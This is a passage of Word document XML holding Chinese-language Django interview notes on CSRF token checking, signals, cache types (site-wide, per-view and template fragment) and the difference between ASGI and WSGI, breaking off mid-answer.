    <w:p w14:paraId="6F6053E9"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注意：你打开浏览器访问某个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>（页面），默认是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>get</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>请求，也就是说，你只要访问了</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>，对应的视图函数里只要不是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>if xx == post</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>的逻辑就会执行，所以你打开页面，他会先生成</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>cookie</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>（</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>token</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>）值，返回给浏览器，然后你提交表单，或者发</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>ajax</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>请求时，会将浏览器的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>cookie</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>信息（</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>token</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>值）发送给服务器进行</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>token</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>比对，这个过程相对于你发起了两次请求，第一次是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>get</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>，第二次才是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>post</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>，搞清楚这个，你才能明白</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>csrf_token</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>是怎么比对的。</w:t>
      </w:r>
      <w:hyperlink w:anchor="%E7%9B%AE%E5%BD%95" w:history="1"/>
    </w:p>
    <w:p w14:paraId="361CB35D" w14:textId="11F7C936" w:rsidR="00024E97" w:rsidRDefault="00B73D4C"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016</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什么是信号量</w:t>
      </w:r>
      <w:r w:rsidR="00024E97">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0619CE75" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="00024E97">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="30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包含一个</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信号调度程序</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，它有助于在框架中的其他位置发生操作时通知分离的应用程序。简而言之，信号允许某些发送者通知一组接收器已经发生了某些动作。当许多代码可能对同一事件感兴趣时，它们特别有用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:hyperlink w:anchor="%E7%9B%AE%E5%BD%95" w:history="1"/>
    </w:p>
    <w:p w14:paraId="7D393398" w14:textId="2CB8B4F7" w:rsidR="00B73D4C" w:rsidRDefault="00B73D4C"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017</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web</w:t>
      </w:r>
      <w:r w:rsidR="00024E97">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>框架的本质是什么</w:t>
      </w:r>
      <w:r w:rsidR="00024E97">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2711FF8D" w14:textId="66FC6EF2" w:rsidR="00024E97" w:rsidRPr="00B73D4C" w:rsidRDefault="00024E97" w:rsidP="00B73D4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73D4C">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>web</w:t>
      </w:r>
      <w:r w:rsidRPr="00B73D4C">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>框架本质是一个</w:t>
      </w:r>
      <w:r w:rsidRPr="00B73D4C">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>socket</w:t>
      </w:r>
      <w:r w:rsidRPr="00B73D4C">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>服务端，用户的浏览器是一个</w:t>
      </w:r>
      <w:r w:rsidRPr="00B73D4C">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>socket</w:t>
      </w:r>
      <w:r w:rsidRPr="00B73D4C">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>客户端。</w:t>
      </w:r>
      <w:hyperlink w:anchor="%E7%9B%AE%E5%BD%95" w:history="1"/>
    </w:p>
    <w:p w14:paraId="18326D67" w14:textId="3C948015" w:rsidR="00024E97" w:rsidRDefault="00467B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020</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00024E97">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidR="00024E97">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>缓存系统类型有哪些</w:t>
      </w:r>
      <w:r w:rsidR="00024E97">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="619BD1F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 xml:space="preserve">1. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>全站缓存，较少使用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31D40BB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MIDDLEWARE_CLASSES = (</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ED22A6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‘django.middleware.cache.UpdateCacheMiddleware’,  # </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>第一</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FB23AE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'django.middleware.common.CommonMiddleware',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="038A058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‘django.middleware.cache.FetchFromCacheMiddleware’,  # </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>最后</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61022D6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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B94DF2D"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 xml:space="preserve">2. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>视图缓存，用户视图函数或视图类中</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0942868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from django.views.decorators.cache import cache_page</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="582EF5C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import time</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C98ABB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@cache_page(15) #</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>超时时间为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>15</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>秒</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28014B9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def index(request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54BD1F0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t=time.time() #</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>获取当前时间</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="765CBE4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return render(request,"index.html",locals())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EFC054D"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 xml:space="preserve">3. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>模板缓存，指缓存不经常变换的模板片段</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="056449A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 load cache %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7369FD4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&lt;h3 style="color: green"&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>不缓存</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>:-----{{ t }}&lt;/h3&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="442691C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cache 2 'name' %} # </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>存的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>key</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16B3DC1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&lt;h3&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>缓存</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>:-----:{{ t }}&lt;/h3&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D0FDCF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endcache %}</w:t>
      </w:r>
      <w:hyperlink w:anchor="%E7%9B%AE%E5%BD%95" w:history="1"/>
    </w:p>
    <w:p w14:paraId="791B5275" w14:textId="0AE12265" w:rsidR="00024E97" w:rsidRDefault="00467B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022</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什么是</w:t>
      </w:r>
      <w:r w:rsidR="00024E97">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>ASGI</w:t>
      </w:r>
      <w:r w:rsidR="00024E97">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>，简述</w:t>
      </w:r>
      <w:r w:rsidR="00024E97">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>WSGI</w:t>
      </w:r>
      <w:r w:rsidR="00024E97">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidR="00024E97">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>ASGI</w:t>
      </w:r>
      <w:r w:rsidR="00024E97">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>的关系与区别</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28374A0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ASGI</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>是异步网关协议接口，一个介于网络协议服务和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Python</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>应用之间的标准接口，能够处理多种通用的协议类型，包括</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>HTTP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>HTTP2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>WebSocket</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C1F4A80"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WSGI</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>是基于</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>HTTP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>协议模式的，不支持</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>WebSocket</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>，而</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>ASGI</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>的诞生则是为了解决</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Python</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
